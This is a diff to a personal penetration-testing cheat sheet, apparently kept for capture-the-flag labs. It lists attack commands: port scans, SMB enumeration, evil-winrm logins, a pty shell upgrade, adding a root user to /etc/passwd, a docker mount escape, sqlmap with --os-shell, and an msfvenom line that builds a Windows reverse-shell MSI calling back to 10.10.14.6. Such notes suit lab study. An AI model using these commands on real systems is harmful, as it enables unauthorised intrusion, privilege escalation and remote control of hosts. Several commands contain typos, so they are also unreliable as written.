@@ -2,7 +2,7 @@
 sudo nmap -O -sS -p- "$target"
 sudo nmap -sU -p- "$target"
 sudo nmap -sC -sV "$target"
-sudo nmap -O -sS -p- target -oA nmap/synscan && sudo nmap -sC -sV target -oA nmap/scriptscan && sudo nmap -sU -p- target -oA nmap/udpscan
+sudo nmap -sC -sV target -oN nmap/scriptscan && sudo nmap -O -sS -p- target -oN nmap/synscan && sudo nmap -sU -p- target -oN nmap/udpscan
 
 # Sudo
 sudo -l
@@ -20,6 +20,7 @@ enum4linux -o "$target" -k none
 smblcient -L "$target"
 smbclient \\\\$target\\WORSPACE
 smbmap -H target -u 0xdf -p 0xdf
+evil-winrm -i target -u user -P password
 
 # Upgrading Shell (pty)
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -47,6 +48,8 @@ wmic qfe get Caption, Description, HotFixID, InstalledOn **installed version**
 openssl password "$pasword" **generate password hash for $password**
 echo "root2:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd
 docker run -v /:/mnt -it alpine
+
+mkpasswd -m sha512 <password>
 
 # WordPress (wp)
 wpscan --url "http://$target" -e
@@ -85,4 +88,7 @@ querygroup <groupnumber>
 binwalk - find hidden parts in binary files (e.g. .tar hidden in an .jpg)
 sqlmap - look for injections -- sqlmap -u 'http://target/dashboard.php?search=any+query' --cookie="PHPSESSID=3bqvp5sdfgobdcipjs24fkdvg2"
 - Also try with the `--os-shell` flag
+
+# MSFVenom
+msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=444 -f msi -o rev.msi
 
